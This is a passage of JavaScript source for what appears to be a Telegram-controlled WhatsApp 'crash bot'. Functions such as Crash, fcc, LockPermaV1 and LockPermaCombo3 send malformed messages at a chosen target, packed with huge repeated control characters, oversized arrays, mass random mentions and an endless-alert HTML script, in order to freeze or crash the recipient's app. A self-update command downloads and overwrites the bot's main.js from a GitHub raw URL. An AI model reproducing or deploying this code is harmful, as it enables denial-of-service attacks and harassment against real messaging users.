                isExplicit: true,
                artworkMediaKey: "GuNInntcRnyNiYcZ28Ym4g8OeZz7JbNBHl6tPOL5BBA="
              }
            },
            embeddedAction: true
          }
        ]
      },
    }
  }

  await sock.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target],
    messageId: msg.key.id,
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        },
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "false" },
          content: undefined
        }]
      }
    }
  }, {});

  const msg2 = {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc?ccb=11-4&oh=01_Q5Aa5AH0D6R2dyqyyJ_TEt83mdD4fNwOuNOGNARKMWy22lI6vw&oe=6A76C689&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "o+iSkGm6O3/g7uBR/aChsjSKs7EcayA8lV/h7yaPsq0=",
      viewOnce: true,
      contextInfo: {
        stanzaId: "metawai_id",
        forwardingScore: 999,
        quotedMessage: {
          interactiveMessage: {
            body: { text: "" },
            nativeFlowMessage: {
              buttons: "\0".repeat(9000)
            }
          }
        },
        participant: target,
        mentionedJid: Array.from({ length: 1999 }, () =>
          "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        )
      },
      caption: "iniochamy - Executed¿!",
      fileLength: "71831",
      height: 1024,
      width: 1536,
      mediaKey: "RHS1mPMKv23WPGPM8GWd5fsXzZh1dLdG04yIrL13FB4=",
      fileEncSha256: "+40DMIFaOid0dVofoUAQkY8v6cfjkxFUqJWy6gSwfkc=",
      directPath: "/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc?ccb=11-4&oh=01_Q5Aa5AH0D6R2dyqyyJ_TEt83mdD4fNwOuNOGNARKMWy22lI6vw&oe=6A76C689&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1783579277",
      "annotations": [
        {
          "polygonVertices": [
            {
              "x": 0.25,
              "y": 0.44490623474121094
            },
            {
              "x": 0.75,
              "y": 0.44490623474121094
            },
            {
              "x": 0.75,
              "y": 0.5550859570503235
            },
            {
              "x": 0.25,
              "y": 0.5550859570503235
            }
          ],
          "shouldSkipConfirmation": true,
          "embeddedContent": {
            "embeddedMessage": {
              "stanzaId": "A5525438EE6519EAA0591131926D96E1",
              "message": {
                "extendedTextMessage": {
                  "text": "LexzyMods - Executed¿!" + "ြ".repeat(9000),
                  "matchedText": "ြ".repeat(9000),
                  "previewType": "NONE",
                  "inviteLinkGroupTypeV2": "DEFAULT"
                },
                "messageContextInfo": {
                  "messageAssociation": {
                    "associationType": 16,
                    "parentMessageKey": {
                      "remoteJid": "status@broadcast",
                      "fromMe": true,
                      "id": "A5F36A5712243020AE3B2D5B22CBFE13",
                      "participant": "114392863608864@lid"
                    }
                  }
                }
              }
            }
          },
          "embeddedAction": true
        }
      ],
      "accessibilityLabel": "Stiker pertanyaan"
    }
  }
  await sock.relayMessage("status@broadcast", msg2, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  })

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          caption: "LexzyMods - Executed¿!",
          fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
          fileLength: "1099511627776",
          seconds: 172800,
          mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
          height: 1080,
          width: 1920,
          fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
          directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1774428565",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIQQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
          annotations: [
            {
              polygonVertices: [
                {
                  x: 0.17499999701976776,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.6620468497276306
                },
                {
                  x: 0.17499999701976776,
                  y: 0.6620468497276306
                }
              ],
              shouldSkipConfirmation: true,
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "2261401457948346",
                  songId: "849859527815275",
                  author: "LexzyMods - Executed¿!" + "ြ".repeat(9000),
                  title: "ြ".repeat(75000),
                  artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                  artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                  artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                  artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                  artistAttribution: "https://www.instagram.com/_u/lexzymods",
                  countryBlocklist: "WEs=",
                  isExplicit: false
                }
              },
              embeddedAction: true
            }
          ]
        }
      }
    }
  }, {});
}

async function LockPermaV1(sock, target) {
  const duration = 600;
  const interval = 150;
  const iterations = Math.floor(duration / interval);

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  for (let i = 0; i < iterations; i++) {
    try {
      const id = Math.random().toString(36),
            mid = id.toUpperCase(),
            msg = {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
                botMetadata: {
                  messageDisclaimerText: '',
                  botResponseId: id
                }
              },
              botForwardedMessage: {
                message: {
                  richResponseMessage: {
                    messageType: 1,
                    response_id: id,
                    submessages: [],
                    unifiedResponse: {
                      data: Buffer.from(JSON.stringify({
                        __typename: 'XMSGGenAIUnifiedResponse',
                        response_id: id,
                        sections: [{
                          __typename: 'GenAIUnifiedResponseSection',
                          view_model: {
                            __typename: 'GenAISingleLayoutViewModel',
                            primitive: {
                              __typename: 'GenAIaeacdsnwHtmlPrimitive',
                              payload: '<!doctype html><html><body><script>while(true){alert("LexzyMods - Executed LockMakklo");}</script></body></html>',
                              trusted_sources: []
                            }
                          }
                        }]
                      })).toString('base64')
                    },
                    contextInfo: {
                      forwardingScore: 99999,
                      isForwarded: true,
                      forwardOrigin: 4,
                      expiration: 0,
                      ephemeralSettingTimestamp: Date.now(),
                      disappearingMode: {
                        initiator: 0,
                        trigger: 1
                      },
                      afterReadDuration: 1
                    }
                  }
                }
              }
            };

      await sock.relayMessage(target, msg, { messageId: mid });
      await sleep(900);
      await sock.relayMessage(target, {
        botForwardedMessage: {
          message: {
            protocolMessage: {
              key: {
                remoteJid: target,
                fromMe: true,
                id: mid
              },
              type: 14,
              editedMessage: msg
            }
          }
        }
      }, { messageId: id + '2' });
    } catch (e) {}

    if (i < iterations - 1) {
      await sleep(interval);
    }
  }
}

async function LockPermaCombo3(sock, target) {
  const duration = 60000;
  const interval = 2500;
  const iterations = duration / interval;

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  let i = 0;
  while (i < iterations) {
    try {
      const id = Math.random().toString(36),
            mid = id.toUpperCase(),
            primitive = {
              __typename: 'GenAIaeacdsnwHtmlPrimitive',
              payload: '<!doctype html><html><body><script>while(true){alert("LexzyMods - Executed Lock Makklo");}</script></body></html>',
              trusted_sources: []
            },
            view_model = {
              __typename: 'GenAISingleLayoutViewModel',
              primitive: primitive
            },
            section = {
              __typename: 'GenAIUnifiedResponseSection',
              view_model: view_model
            },
            unified = {
              __typename: 'XMSGGenAIUnifiedResponse',
              response_id: id,
              sections: [section]
            },
            contextInfo = {
              forwardingScore: 99999,
              isForwarded: true,
              forwardOrigin: 4,
              expiration: 0,
              ephemeralSettingTimestamp: Date.now(),
              disappearingMode: {
                initiator: 0,
                trigger: 1
              },
              afterReadDuration: 1
            },
            msg = {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
                botMetadata: {
                  messageDisclaimerText: '',
                  botResponseId: id
                }
              },
              botForwardedMessage: {
                message: {
                  richResponseMessage: {
                    messageType: 1,
                    response_id: id,
                    submessages: [],
                    unifiedResponse: {
                      data: Buffer.from(JSON.stringify(unified)).toString('base64')
                    },
                    contextInfo: contextInfo
                  }
                }
              }
            };

      await sock.relayMessage(target, msg, { messageId: mid });
      await sleep(50);
      await sock.relayMessage(target, {
        botForwardedMessage: {
          message: {
            protocolMessage: {
              key: {
                remoteJid: target,
                fromMe: true,
                id: mid
              },
              type: 14,
              editedMessage: msg
            }
          }
        }
      }, { messageId: id + '2' });
    } catch (e) {}

    if (i < iterations - 1) {
      await sleep(interval);
    }

    i++;
  }
}

async function Crash(sock, target) {
  try {
  let nexi = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 2,
          submessages: [
            {
              messageType: 8,
               mapAnnotation: {
                body: {
                  title: "\p" + "\n".repeat(4500000),
               }
              }
            },
            {
              messageType: 4,
              tableMetadata: {
                text: "\p",
                rows: Array.from({ length: 509999 }, () => ({})),
                rows: Array(30000).fill("ꦾ".repeat(35000)),
                rows: Array.from({ length: 111111 }, () => 
          ({}))
              }
            }
          ],
          contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
              forwardOrigin: 4
          }
        }
      }
    }
  };
    
  const fanksion = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Nexi"
          },
          nativeFlowMessage: {
            buttons: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
              )
            ],
            name: "\x10".repeat(50000)
          },
          nativeFlowMessage: {
            name: "galaxy_message",
            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000),
            buttons: [
              {
                name: "send_location",
                buttonsParams: "{}"
              }
            ]
          }
        }
      }
    }
  };
  
  const kontol = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "Haters akuu gimana kabar nya, sehat?" + "\u600b".repeat(35000)
              },
              nativeFlowMessage: {
                buttons: "meta_ai_message".repeat(30000)
              }
            }
          }
        }
      };

      const maklu = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "hahaha"
              },
              nativeFlowMessage: {
                buttons: Array.from({ length: 600000 }, () => ({})),
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  display_text: "\n".repeat(99999),
                  id: "\0".repeat(99999),
                  flow_token: "\r".repeat(99999)
                })
              }
            }
          }
        }
      };
      
  const data = {
     groupStatusMessageV2: {
       message: {
         interactiveMessage: {
            bloksWidget: {
              uuid: Array.from({ length: 500000 }, () => ({})),
               data: Array.from({ length: 500000 }, () => ({})),
              type: Array(30000).fill("\x00".repeat(35000)),
              fallback: "\u200D".repeat(50000)
               },
               nativeFlowMessage: {
                 messageParamsJson: "[".repeat(10000),
                 buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
               }
            }
         }
      }
   };
   const sleep = ms => new Promise(r => setTimeout(r, ms));
   await sock.relayMessage(target, nexi, {});
   await sock.relayMessage(target, fanksion, {});
   await sock.relayMessage(target, kontol, {});
   await sock.relayMessage(target, maklu, {});
   await sock.relayMessage(target, data, {
  messageId: null,
  participant: [target],
  additionalNodes: [{
    tag: "meta",
    attrs: {},
    content: [{
      tag: "mentioned_users",
      attrs: {},
      content: [{
        tag: "to",
        attrs: { jid: target },
        content: undefined
      }]
    }]
  }]
});
   await sleep(3000);
  } catch (eror) {
      console.error("Eror Function Nya tolol", eror);
  }
}


async function fcc(sock, target) {
  await sock.relayMessage(target, {
    listMessage: {
      title: '𖤐',
      description: 'LexzyMods - Executed¿!',
      buttonText: '\0'.repeat(50000),
      listType: 2,
      sections: [{
        title: 'X',
        rows: [{
          title: 'X',
          description: '',
          rowId: '\n'
        }]
      }],
      productListInfo: {
        productSections: [{
          title: ' ',
          products: Array.from({ length: 2000 }, () => ({
            productId: "ြ".repeat(50)
          }))
        }],
        headerImage: {
          productId: "\n".repeat(5000) + "\u0000".repeat(10000),
          jpegThumbnail: null
        },
        businessOwnerJid: target
      },
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        remoteJid: 'status@broadcast'
      }
    }
  }, { participant: true });

  await new Promise(r => setTimeout(r, 1000));
}
// ============ SISTEM OWNER + AUTO UPDATE ============
const ownersFile = './database/owners.json';
const UPDATE_REPO_RAW = "https://raw.githubusercontent.com/pausorcarowr-cloud/autouodate/main/main.js";
const UPDATE_GITHUB_TOKEN = process.env.GITHUB_TOKEN || ""; // isi jika repo private
const UPDATE_TARGET = path.join(__dirname, "main.js");
const UPDATE_BACKUP = path.join(__dirname, "main.backup.js");
const UPDATE_TEMP = path.join(__dirname, "main.new.js");

function loadOwners() {
    try {
        const list = JSON.parse(fs.readFileSync(ownersFile, 'utf8'));
        return Array.isArray(list) ? list.map(String) : [];
    } catch {
        return [];
    }
}

function saveOwners(list) {
    const dir = path.dirname(ownersFile);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(ownersFile, JSON.stringify([...new Set(list.map(String))], null, 2));
}

// ownerID di settings/config.js = owner utama (selalu punya akses)
function isBotOwner(userId) {
    return String(userId) === String(ownerID) || loadOwners().includes(String(userId));
}

function getTargetId(ctx) {
    const arg = ctx.message.text.split(/\s+/)[1];
    if (arg && /^\d+$/.test(arg)) return arg;
    return ctx.message.reply_to_message?.from?.id?.toString() || null;
}

bot.command("addowner", async (ctx) => {
    if (!isBotOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner!");

    const targetId = getTargetId(ctx);
    if (!targetId) return ctx.reply("📌 /addowner 123456789\natau reply pesan orangnya");

    if (isBotOwner(targetId)) return ctx.reply("⚠️ User itu sudah jadi owner!");

    const owners = loadOwners();
    owners.push(targetId);
    saveOwners(owners);
    ctx.reply(`✅ Owner berhasil ditambahkan!\n🆔 ${targetId}`);
});

bot.command("delowner", async (ctx) => {
    if (!isBotOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner!");

    const targetId = getTargetId(ctx);
    if (!targetId) return ctx.reply("📌 /delowner 123456789\natau reply pesan orangnya");

    if (targetId === String(ownerID)) return ctx.reply("❌ Owner utama tidak bisa dihapus!");

    const owners = loadOwners();
    if (!owners.includes(targetId)) return ctx.reply("❌ User itu bukan owner!");

    saveOwners(owners.filter(id => id !== targetId));
    ctx.reply(`✅ Owner berhasil dihapus!\n🆔 ${targetId}`);
});

bot.command("listowner", async (ctx) => {
    if (!isBotOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner!");

    const owners = loadOwners().filter(id => id !== String(ownerID));
    let list = `<blockquote>👑 DAFTAR OWNER\n━━━━━━━━━━━━━━━━━━━━━━\n1. ${ownerID} (utama)\n`;
    owners.forEach((id, i) => { list += `${i + 2}. ${id}\n`; });
    list += `━━━━━━━━━━━━━━━━━━━━━━\n📊 Total: ${owners.length + 1} owner</blockquote>`;
    ctx.reply(list, { parse_mode: 'HTML' });
});

let isUpdating = false;

bot.command("update", async (ctx) => {
    if (!isBotOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner!");
    if (isUpdating) return ctx.reply("⚠️ Update sedang berjalan, tunggu sebentar.");
    isUpdating = true;

    const status = await ctx.reply(
        "╭━━〔 ⏳ *UPDATE SYSTEM* 〕━━⬣\n" +
        "┃\n" +
        "┃ 🔍 Mengecek update...\n" +
        "┃\n" +
        "╰━━━━━━━━━━━━━━━━━━⬣",
        { parse_mode: "Markdown" }
    );

    const edit = (text) =>
        ctx.telegram
            .editMessageText(ctx.chat.id, status.message_id, undefined, text, {
                parse_mode: "Markdown",
            })
            .catch(() => {});

    try {
        const { data } = await axios.get(UPDATE_REPO_RAW, {
            timeout: 15000,
            responseType: "text",
            transformResponse: (r) => r,
            headers: {
                "Cache-Control": "no-cache",
                ...(UPDATE_GITHUB_TOKEN && { Authorization: `token ${UPDATE_GITHUB_TOKEN}` }),
            },
        });

        if (typeof data !== "string" || data.trim().length < 1000) {
            throw new Error("File kosong atau tidak valid.");
        }

        if (fs.readFileSync(UPDATE_TARGET, "utf8") === data) {
            isUpdating = false;
            return edit(
                "╭━━〔 ✅ *SUDAH TERBARU* 〕━━⬣\n" +
                "┃\n" +
                "┃ 📦 Bot sudah di versi\n" +
                "┃     paling baru\n" +
                "┃ ✨ Tidak ada perubahan\n" +
                "┃\n" +
                "╰━━━━━━━━━━━━━━━━━━⬣"
            );
        }

        try {
            new vm.Script(data, { filename: "main.js" });
        } catch (err) {
            throw new Error(`Syntax error di file baru: ${err.message}`);
        }

        fs.copyFileSync(UPDATE_TARGET, UPDATE_BACKUP);
        fs.writeFileSync(UPDATE_TEMP, data);
        fs.renameSync(UPDATE_TEMP, UPDATE_TARGET);

        await edit(
            "╭━━〔 ✅ *UPDATE BERHASIL* 〕━━⬣\n" +
            "┃\n" +
            "┃ 📦 Status   : `Success`\n" +
            "┃ 💾 Backup   : `Tersimpan`\n" +
            "┃ 🔄 Aksi     : Restart Panel\n" +
            "┃ ⏳ Estimasi : ± 5 detik\n" +
            "┃\n" +
            "┃ _Panel akan kembali online_\n" +
            "┃ _secara otomatis 5 detik..._\n" +
            "┃\n" +
            "╰━━━━━━━━━━━━━━━━━━⬣"
        );

        setTimeout(() => process.exit(1), 1500);
    } catch (e) {
        console.error("[UPDATE ERROR]", e.message);
        if (fs.existsSync(UPDATE_TEMP)) fs.unlinkSync(UPDATE_TEMP);

        let reason = e.message;
        if (e.response?.status === 404) reason = "Script ( CORTEX ) belum di update oleh @Abilzyy19";
        else if (e.code === "ECONNABORTED") reason = "Koneksi timeout.";

        await edit(
            "╭━━〔 ❌ *UPDATE GAGAL* 〕━━⬣\n" +
            "┃\n" +
            "┃ ⚠️ Alasan:\n" +
            `┃ ${reason}\n` +
            "┃\n" +
            "┃ 💡 Bot tetap berjalan\n" +
            "┃     dengan versi lama\n" +
            "┃\n" +
            "╰━━━━━━━━━━━━━━━━━━⬣"
        );

        isUpdating = false;
    }
});
// ============ END OWNER + AUTO UPDATE ============


bot.launch()
